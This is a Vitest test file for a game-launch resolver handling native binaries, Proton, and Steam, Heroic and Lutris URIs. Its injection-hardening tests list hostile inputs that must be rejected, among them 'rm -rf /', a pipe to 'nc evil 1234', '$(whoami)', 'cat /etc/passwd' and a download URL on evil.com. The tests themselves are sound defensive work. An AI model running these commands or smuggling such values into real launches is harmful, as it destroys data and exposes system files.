import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import { beforeEach, describe, expect, it, vi } from "vitest";

import ProtonPaths from "./ProtonPaths";
import { ProtonUnavailable } from "./ProtonUnavailable";
import { resolveUnifiedLaunch } from "./unifiedLaunchProvider";

describe("unifiedLaunchProvider", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it("handles native Linux binaries directly without Proton", () => {
    const result = resolveUnifiedLaunch({
      commandLine: ["--help"],
      executablePath: "/usr/bin/bash",
      gameId: "custom-game",
      isGame: true,
      workingDirectory: "/tmp",
    });

    expect(result.mode).toBe("native");
    expect(result.executable).toBe("/usr/bin/bash");
    expect(result.parameters).toEqual(["--help"]);
    expect(result.prefixPath).toBeUndefined();
  });

  it("handles Heroic URI launch protocol", () => {
    const result = resolveUnifiedLaunch({
      executablePath: "heroic://launch/12345",
      gameId: "witcher3",
      isGame: true,
      store: "heroic",
    });

    expect(result.mode).toBe("heroic-uri");
    expect(result.executable).toBe("heroic://launch/12345");
  });

  it("handles Lutris URI launch protocol", () => {
    const result = resolveUnifiedLaunch({
      executablePath: "lutris:rungame/skyrim-se",
      gameId: "skyrimse",
      isGame: true,
      store: "lutris",
    });

    expect(result.mode).toBe("lutris-uri");
    expect(result.executable).toBe("lutris:rungame/skyrim-se");
  });

  it("does not treat a Windows executable as a launcher URI based on store alone", () => {
    expect(() =>
      resolveUnifiedLaunch({
        executablePath: "/games/tool.exe",
        gameId: "witcher3",
        isGame: false,
        store: "heroic",
      }),
    ).toThrow(ProtonUnavailable);
  });

  it("constructs Proton launch plan for Windows executables", () => {
    vi.spyOn(ProtonPaths, "resolve").mockReturnValue({
      prefixPath: "/steam/compatdata/489830/pfx",
      protonPath: "/steam/common/Proton 9.0",
      steamPath: "/steam",
      appId: "489830",
    } as any);

    const result = resolveUnifiedLaunch({
      commandLine: ["-skse"],
      enableProtonLogs: true,
      executablePath: "/games/Skyrim/skse64_loader.exe",
      gameId: "skyrimse",
      isGame: true,
    });

    expect(result.mode).toBe("steam-proton");
    expect(result.executable).toBe("/steam/common/Proton 9.0/proton");
    expect(result.parameters).toEqual(["run", "/games/Skyrim/skse64_loader.exe", "-skse"]);
    expect(result.environment.STEAM_COMPAT_DATA_PATH).toBe("/steam/compatdata/489830");
    expect(result.environment.STEAM_COMPAT_TOOL_PATHS).toBe("/steam/common/Proton 9.0");
    expect(result.environment.STEAM_COMPAT_MOUNTS).toBe("/games/Skyrim");
    expect(result.environment.WINEPREFIX).toBe("/steam/compatdata/489830/pfx");
    expect(result.environment.PROTON_LOG).toBe("1");
    expect(result.logFilePath).toContain("proton-skyrimse.log");
  });

  it("uses a pre-resolved Proton context supplied by the launcher integration", () => {
    const resolveSpy = vi.spyOn(ProtonPaths, "resolve");

    const result = resolveUnifiedLaunch({
      executablePath: "/tools/xEdit.exe",
      gameId: "skyrimse",
      isGame: false,
      protonContext: {
        appId: "489830",
        gamePath: "/games/Skyrim",
        prefixPath: "/steam/compatdata/489830/pfx",
        protonPath: "/steam/common/Proton 9.0",
        steamPath: "/steam",
      },
    });

    expect(resolveSpy).not.toHaveBeenCalled();
    expect(result.executable).toBe("/steam/common/Proton 9.0/proton");
    expect(result.parameters).toEqual(["run", "/tools/xEdit.exe"]);
  });

  it("resolves the persisted custom runtime inside the unified provider", () => {
    const runtimePath = fs.mkdtempSync(path.join(os.tmpdir(), "vortex-custom-proton-"));
    fs.writeFileSync(path.join(runtimePath, "proton"), "#!/bin/sh", { mode: 0o755 });
    try {
      const result = resolveUnifiedLaunch({
        executablePath: "/tools/xEdit.exe",
        gameId: "skyrimse",
        isGame: false,
        protonContext: {
          appId: "489830",
          gamePath: "/games/Skyrim",
          prefixPath: "/steam/compatdata/489830/pfx",
          protonPath: "/steam/common/Proton 9.0",
          steamPath: "/steam",
        },
        protonRuntimePreference: { path: runtimePath, type: "custom" },
        protonRuntimeValidation: { checkDefaultUntrustedRoots: false },
      });

      expect(result.mode).toBe("custom-proton");
      expect(result.executable).toBe(path.join(runtimePath, "proton"));
    } finally {
      fs.rmSync(runtimePath, { force: true, recursive: true });
    }
  });

  it("rejects custom runtime in unsafe temporary directories by default", () => {
    const runtimePath = fs.mkdtempSync(path.join(os.tmpdir(), "vortex-unsafe-proton-"));
    fs.writeFileSync(path.join(runtimePath, "proton"), "#!/bin/sh", { mode: 0o755 });
    try {
      expect(() =>
        resolveUnifiedLaunch({
          executablePath: "/tools/xEdit.exe",
          gameId: "skyrimse",
          isGame: false,
          protonContext: {
            appId: "489830",
            gamePath: "/games/Skyrim",
            prefixPath: "/steam/compatdata/489830/pfx",
            protonPath: "/steam/common/Proton 9.0",
            steamPath: "/steam",
          },
          protonRuntimePreference: { path: runtimePath, type: "custom" },
        }),
      ).toThrowError(/unsafe temporary, download, or staging content/);
    } finally {
      fs.rmSync(runtimePath, { force: true, recursive: true });
    }
  });

  it("throws ProtonUnavailable when prefix is missing", () => {
    vi.spyOn(ProtonPaths, "resolve").mockReturnValue({
      prefixPath: undefined,
      protonPath: "/steam/common/Proton 9.0",
    } as any);

    expect(() =>
      resolveUnifiedLaunch({
        executablePath: "/games/Skyrim/SkyrimSE.exe",
        gameId: "skyrimse",
        isGame: true,
      }),
    ).toThrowError();
  });

  describe("launcher URI and argument injection hardening", () => {
    it("rejects unsafe URI protocols", () => {
      const unsafeProtocols = [
        "file:///etc/shadow",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "http://evil.com/payload.exe",
        "https://malicious.org/install.sh",
        "ftp://mirror.net/file.bin",
      ];

      for (const uri of unsafeProtocols) {
        expect(() =>
          resolveUnifiedLaunch({
            executablePath: uri,
            gameId: "skyrimse",
            isGame: true,
          }),
        ).toThrowError(/Refusing to launch unsafe protocol/);
      }
    });

    it("rejects Steam URIs containing shell injection or malformed actions", () => {
      const maliciousSteamUris = [
        "steam://run/489830; rm -rf /",
        "steam://run/489830 & echo pwned",
        "steam://run/489830 | nc evil 1234",
        "steam://run/489830$(whoami)",
        "steam://run/489830`reboot`",
        "steam://run/489830\nmalicious",
        "steam://run/../489830",
        "steam://settings",
        "steam://open/console",
      ];

      for (const uri of maliciousSteamUris) {
        expect(() =>
          resolveUnifiedLaunch({
            executablePath: uri,
            gameId: "skyrimse",
            isGame: true,
          }),
        ).toThrowError(/Refusing to launch unsafe Steam URI|invalid control characters/);
      }
    });

    it("rejects Heroic URIs containing shell metacharacters or malformed syntax", () => {
      const maliciousHeroicUris = [
        "heroic://launch/12345; reboot",
        "heroic://launch/12345 && cat /etc/passwd",
        "heroic://launch?appName=test&runner=gog;rm -rf /",
        "heroic://launch?appName=$(whoami)",
        "heroic://settings",
      ];

      for (const uri of maliciousHeroicUris) {
        expect(() =>
          resolveUnifiedLaunch({
            executablePath: uri,
            gameId: "witcher3",
            isGame: true,
          }),
        ).toThrowError(/Refusing to launch unsafe Heroic URI/);
      }
    });

    it("rejects Lutris URIs containing shell metacharacters, spaces, or directory traversal", () => {
      const maliciousLutrisUris = [
        "lutris:rungame/skyrim-se | rm -rf /",
        "lutris:rungame/skyrim-se; echo pwned",
        "lutris:rungame/skyrim se with spaces",
        "lutris:rungame/../traversal/slug",
        "lutris:rungame/skyrim`id`",
        "lutris:rungame/skyrim$(id)",
      ];

      for (const uri of maliciousLutrisUris) {
        expect(() =>
          resolveUnifiedLaunch({
            executablePath: uri,
            gameId: "skyrimse",
            isGame: true,
          }),
        ).toThrowError(/Refusing to launch unsafe Lutris URI/);
      }
    });

    it("rejects control characters and null bytes in executable path", () => {
      expect(() =>
        resolveUnifiedLaunch({
          executablePath: "/games/Skyrim/SkyrimSE.exe\0malicious",
          gameId: "skyrimse",
          isGame: true,
        }),
      ).toThrowError(/invalid control characters/);

      expect(() =>
        resolveUnifiedLaunch({
          executablePath: "/games/Skyrim/SkyrimSE.exe\ninjection",
          gameId: "skyrimse",
          isGame: true,
        }),
      ).toThrowError(/invalid control characters/);
    });

    it("rejects control characters and null bytes in command line arguments", () => {
      expect(() =>
        resolveUnifiedLaunch({
          commandLine: ["-arg", "val\0evil"],
          executablePath: "/usr/bin/bash",
          gameId: "skyrimse",
          isGame: true,
        }),
      ).toThrowError(/Command line argument contains invalid control characters/);

      expect(() =>
        resolveUnifiedLaunch({
          commandLine: ["-arg", "val\nevil"],
          executablePath: "/usr/bin/bash",
          gameId: "skyrimse",
          isGame: true,
        }),
      ).toThrowError(/Command line argument contains invalid control characters/);
    });

    it("ensures parameters are strictly passed as separated arrays and never concatenated into a shell command", () => {
      const nativePlan = resolveUnifiedLaunch({
        commandLine: ["-flag", "value with spaces", "; echo test"],
        executablePath: "/usr/bin/env",
        gameId: "custom",
        isGame: true,
      });
      expect(Array.isArray(nativePlan.parameters)).toBe(true);
      expect(nativePlan.parameters).toEqual(["-flag", "value with spaces", "; echo test"]);

      vi.spyOn(ProtonPaths, "resolve").mockReturnValue({
        prefixPath: "/steam/compatdata/489830/pfx",
        protonPath: "/steam/common/Proton 9.0",
        steamPath: "/steam",
        appId: "489830",
      } as any);

      const protonPlan = resolveUnifiedLaunch({
        commandLine: ["-arg1", "first", "-arg2", "second & third"],
        executablePath: "/games/Skyrim/SkyrimSE.exe",
        gameId: "skyrimse",
        isGame: true,
      });
      expect(Array.isArray(protonPlan.parameters)).toBe(true);
      expect(protonPlan.parameters).toEqual([
        "run",
        "/games/Skyrim/SkyrimSE.exe",
        "-arg1",
        "first",
        "-arg2",
        "second & third",
      ]);
    });
  });
});
